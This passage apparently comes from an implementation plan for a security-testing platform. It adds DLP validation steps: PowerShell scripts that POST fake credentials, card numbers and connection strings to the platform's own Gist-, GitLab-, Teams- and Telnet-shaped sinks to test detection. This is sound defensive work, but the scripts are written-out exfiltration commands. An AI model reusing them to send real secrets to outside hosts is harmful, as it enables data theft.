      $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/teams/webhookb2/00000000-0000-0000-0000-000000000000/IncomingWebhook/11111111111111111111111111111111/22222222-2222-2222-2222-222222222222"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: teams_webhook_result=success"
        Write-Output "EXEC T1567.004: Maestro-card-shaped Teams webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
      } catch {
        Write-Output "DLP_OBSERVATION: teams_webhook_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.004: Microsoft Teams-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
      }
      # See the Slack step above for why this step's graded verdict never
      # comes from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-webhook.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-webhook.yaml scenarios/dlp-exfiltration-webhook.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to webhook DLP channel"
```

---

### Task 7: Code repository channel — 4 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-coderepo.yaml`
- Modify: `scenarios/dlp-exfiltration-coderepo.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_WEBHOOK_HOST}}` / `{{SINK_WEBHOOK_PORT}}` placeholders, GitHub Gist path/`Authorization` header shape, and GitLab Snippet path/`PRIVATE-TOKEN` header shape.
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Append 4 new steps to `scenarios/dlp-exfiltration-coderepo.yaml`, after the existing 2 provider steps**

```yaml
  # ---------------------------------------------------------------------------
  # Content-type diversity — PHP Source Code over GitHub Gist shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — GitHub Gist-Compatible Exfiltration of PHP Source Code (T1567.001)"
    technique_id: T1567.001
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs synthetic PHP-source-code-shaped content (embedded fake secret) to the platform's own GitHub-Gist-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitHub API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: GitHub-Gist-API-shaped HTTPS POST (path, Authorization header, JSON body) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "<?php // [BAS-SIM-DLP]`n`$db_password = `"BAS-SIM-DLP-Placeholder9`"; ?>"
      $token = "{{SINK_TOKEN}}"
      $files = @{ "$token.dat" = @{ content = $payload } }
      $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
          -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: github_gist_result=success"
        Write-Output "EXEC T1567.001: PHP-source-code-shaped GitHub Gist traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
      } catch {
        Write-Output "DLP_OBSERVATION: github_gist_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.001: GitHub Gist-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the code-repository
      # sink actually received a request with a matching token, resolved
      # server-side by internal/webhooksink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — Perl Source Code over GitHub Gist shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — GitHub Gist-Compatible Exfiltration of Perl Source Code (T1567.001)"
    technique_id: T1567.001
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs synthetic Perl-source-code-shaped content (embedded fake secret) to the platform's own GitHub-Gist-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitHub API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: GitHub-Gist-API-shaped HTTPS POST (path, Authorization header, JSON body) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "# [BAS-SIM-DLP]`nmy `$secret = `"BAS-SIM-DLP-Placeholder10`"; # test fixture"
      $token = "{{SINK_TOKEN}}"
      $files = @{ "$token.dat" = @{ content = $payload } }
      $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
          -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: github_gist_result=success"
        Write-Output "EXEC T1567.001: Perl-source-code-shaped GitHub Gist traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
      } catch {
        Write-Output "DLP_OBSERVATION: github_gist_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.001: GitHub Gist-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the code-repository
      # sink actually received a request with a matching token, resolved
      # server-side by internal/webhooksink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — Azure Cloud Credentials over GitLab Snippet shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — GitLab Snippet-Compatible Exfiltration of Azure Cloud Credentials (T1567.001)"
    technique_id: T1567.001
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Azure-credential-shaped snippet to the platform's own GitLab-Snippet-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitLab API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: GitLab-Snippet-API-shaped HTTPS POST (path, PRIVATE-TOKEN header, JSON body) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "{`"appId`":`"00000000-1111-0000-0000-000000000000`",`"displayName`":`"BAS-SIM-DLP-ServicePrincipal`",`"password`":`"df111111-0000-0000-0000-100000000000`",`"tenant`":`"11111111-0000-0000-0000-000000000000`"}"
      $token = "{{SINK_TOKEN}}"
      $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $payload } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
          -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: gitlab_snippet_result=success"
        Write-Output "EXEC T1567.001: Azure-credential-shaped GitLab Snippet traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
      } catch {
        Write-Output "DLP_OBSERVATION: gitlab_snippet_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.001: GitLab Snippet-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
      }
      # See the GitHub step above for why this step's graded verdict
      # never comes from this script's own success/failure.
    cleanup: ""

  # ---------------------------------------------------------------------------
  # Content-type diversity — DB2 Connection String over GitLab Snippet shape
  # ---------------------------------------------------------------------------
  - name: "DLP Validation — GitLab Snippet-Compatible Exfiltration of DB2 Connection String (T1567.001)"
    technique_id: T1567.001
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic DB2-connection-string-shaped snippet to the platform's own GitLab-Snippet-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitLab API request."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/CASB: GitLab-Snippet-API-shaped HTTPS POST (path, PRIVATE-TOKEN header, JSON body) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "DATABASE=BASSIMDLP;HOSTNAME=bas-sim-db2;PORT=50000;PROTOCOL=TCPIP;UID=bas_sim_user;PWD=BAS-SIM-DLP-Placeholder5;"
      $token = "{{SINK_TOKEN}}"
      $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $payload } | ConvertTo-Json -Compress
      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
          -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: gitlab_snippet_result=success"
        Write-Output "EXEC T1567.001: DB2-connection-string-shaped GitLab Snippet traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
      } catch {
        Write-Output "DLP_OBSERVATION: gitlab_snippet_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1567.001: GitLab Snippet-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
      }
      # See the GitHub step above for why this step's graded verdict
      # never comes from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-coderepo.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-coderepo.yaml scenarios/dlp-exfiltration-coderepo.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to code repository DLP channel"
```

---

### Task 8: Telnet channel — 3 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-telnet.yaml`
- Modify: `scenarios/dlp-exfiltration-telnet.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_TELNET_HOST}}` / `{{SINK_TELNET_PORT}}` placeholders and the JSON conversation-array shape (`connect` → `prompt` → `command` → `response` → `close`).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Append 3 new steps to `scenarios/dlp-exfiltration-telnet.yaml`, after the existing single step**

```yaml
  - name: "DLP Validation — Telnet Exfiltration of AWS Cloud Credentials (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic AWS-credential-shaped record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, traffic-shape simulation only, not an actual Telnet connection."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
      $token = "{{SINK_TOKEN}}"
      $session = @(
        @{ type = "connect" }
        @{ type = "prompt"; data = "login: " }
        @{ type = "command"; data = "$token`n$payload" }
        @{ type = "response"; data = "Login successful`n$ " }
        @{ type = "close" }
      )
      $body = @{
        token = $token
        session = $session
      } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
        Write-Output "EXEC T1048.003: AWS-credential-shaped Telnet session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      } catch {
        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the Telnet sink actually
      # received a request with a matching token, resolved server-side by
      # internal/telnetsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own success/failure.
    cleanup: ""

  - name: "DLP Validation — Telnet Exfiltration of Discover Card Record (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Discover-card-shaped record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, traffic-shape simulation only, not an actual Telnet connection."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nDiscover,6011111111111117"
      $token = "{{SINK_TOKEN}}"
      $session = @(
        @{ type = "connect" }
        @{ type = "prompt"; data = "login: " }
        @{ type = "command"; data = "$token`n$payload" }
        @{ type = "response"; data = "Login successful`n$ " }
        @{ type = "close" }
      )
      $body = @{
        token = $token
        session = $session
      } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
        Write-Output "EXEC T1048.003: Discover-card-shaped Telnet session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      } catch {
        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the Telnet sink actually
      # received a request with a matching token, resolved server-side by
      # internal/telnetsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own success/failure.
    cleanup: ""

  - name: "DLP Validation — Telnet Exfiltration of Oracle DB Connection String (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Oracle-DB-connection-string-shaped record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, traffic-shape simulation only, not an actual Telnet connection."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
    detection:
      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "Data Source=BAS-SIM-ORACLE;User Id=bas_sim_user;Password=BAS-SIM-DLP-Placeholder1;"
      $token = "{{SINK_TOKEN}}"
      $session = @(
        @{ type = "connect" }
        @{ type = "prompt"; data = "login: " }
        @{ type = "command"; data = "$token`n$payload" }
        @{ type = "response"; data = "Login successful`n$ " }
        @{ type = "close" }
      )
      $body = @{
        token = $token
        session = $session
      } | ConvertTo-Json -Depth 5 -Compress
      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
      try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
        Write-Output "EXEC T1048.003: Oracle-connection-string-shaped Telnet session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      } catch {
        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
      # graded verdict comes entirely from whether the Telnet sink actually
      # received a request with a matching token, resolved server-side by
      # internal/telnetsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own success/failure.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-telnet.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-telnet.yaml scenarios/dlp-exfiltration-telnet.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to telnet DLP channel"
```

---

### Task 9: Full-suite verification

**Files:** none modified — verification only.

**Interfaces:**
- Consumes: all 8 files modified in Tasks 1-8.

- [ ] **Step 1: Confirm every modified file parses, loads, and its signature verifies**

Run from `orchestrator/`:
```bash
go test ./internal/scenario/... -v
```
Expected: PASS, no `Load()` regressions across any scenario file (a bad signature or malformed YAML in any of the 8 files would surface as that file silently not loading, per `TestLoad_SkipsMalformedFileWithoutBlockingOthers`'s documented guarantee — check the test output/coverage doesn't show a drop in loaded-scenario count if such a test exists; otherwise confirm manually per Step 2 below).

- [ ] **Step 2: Manually confirm each file's step count**

Run (from repo root):
```bash
grep -c "^  - name:" scenarios/dlp-exfiltration-sink-https.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-dns-tunnel.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-sftp.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-smtp.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-cloud-storage.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-webhook.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-coderepo.yaml
grep -c "^  - name:" scenarios/dlp-exfiltration-telnet.yaml
```
Expected counts: 6, 4, 6, 6, 11, 5, 6, 4 (original count + new steps: 1+5, 1+3, 1+5, 1+5, 7+4, 2+3, 2+4, 1+3).

- [ ] **Step 3: Run the full affected-package suite**

```bash
go test ./internal/scenario/... ./internal/api/... ./internal/verifysync/... ./internal/reporting/...
```
Expected: PASS, no regressions (no Go code changed by this plan, so this is a pure no-op-expected regression guard).

- [ ] **Step 4: gofmt/vet sanity (YAML files aren't Go, but confirm nothing else drifted)**

```bash
git status
```
Expected: only the 16 files from Tasks 1-8 (8 `.yaml` + 8 `.yaml.sig`) show as modified; nothing else touched.

- [ ] **Step 5: Final commit (only if Step 2's counts required a fix-up not already committed per-task)**

If Tasks 1-8 were each already committed individually (per their own Step 4), this task needs no commit — it's verification-only. If any fix-ups were needed, commit them now with a message describing what was corrected.

---

## Self-Review Notes (completed during plan authoring, not a separate pass)

- **Spec coverage:** all 6 content families × their assigned channels from the spec's mapping table are present — 32 steps total (5+3+5+5+4+3+4+3), matching the spec's per-file counts exactly.
- **Placeholder scan:** every step has full, literal PowerShell content; no `TBD`/`similar to above`/deferred content.
- **Type/convention consistency:** every new step matches its file's existing `technique_id`, `detection_profiles`, and placeholder names exactly (verified by reading each of the 8 files in full before drafting their tasks). Step-name pattern (`"DLP Validation — <Channel> Exfiltration of <Content> (T<technique>)"`) is consistent across all 32 new steps.
